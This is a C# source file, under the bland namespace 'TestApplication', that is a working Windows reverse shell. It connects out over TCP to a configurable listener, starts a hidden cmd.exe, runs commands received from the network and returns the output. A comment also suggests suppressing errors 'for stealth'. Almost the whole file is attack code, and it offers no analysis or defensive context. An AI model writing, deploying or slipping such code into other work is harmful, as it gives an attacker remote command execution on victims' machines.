using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;

namespace TestApplication
{
    class Program
    {
        static void Main(string[] args)
        {
            // Change this to the remote listener's IP if needed
            string remoteHost = "127.0.0.1";
            int remotePort = 1234;

            using (TcpClient client = new TcpClient())
            {
                try
                {
                    client.Connect(remoteHost, remotePort);
                    using (NetworkStream stream = client.GetStream())
                    {
                        // Start cmd.exe with redirected streams
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd.exe",
                                RedirectStandardInput = true,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            }
                        };
                        proc.Start();

                        // Thread: stdin of this process → network
                        new Thread(() =>
                        {
                            try
                            {
                                StreamReader procStdOut = proc.StandardOutput;
                                StreamReader procStdErr = proc.StandardError;
                                StreamWriter netWriter = new StreamWriter(stream) { AutoFlush = true };

                                string line;
                                while ((line = procStdOut.ReadLine()) != null)
                                {
                                    netWriter.WriteLine(line);
                                }
                                while ((line = procStdErr.ReadLine()) != null)
                                {
                                    netWriter.WriteLine(line);
                                }
                            }
                            catch { }
                        })
                        { IsBackground = true }.Start();

                        // Main thread: network → stdin of cmd.exe
                        using (StreamReader netReader = new StreamReader(stream))
                        using (StreamWriter procStdIn = proc.StandardInput)
                        {
                            string cmd;
                            while ((cmd = netReader.ReadLine()) != null)
                            {
                                procStdIn.WriteLine(cmd);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Could not connect or I/O error
                    // For stealth, you might suppress this; but for debugging:
                    Console.Error.WriteLine($"[!] Error: {ex.Message}");
                }
            }
        }
    }
}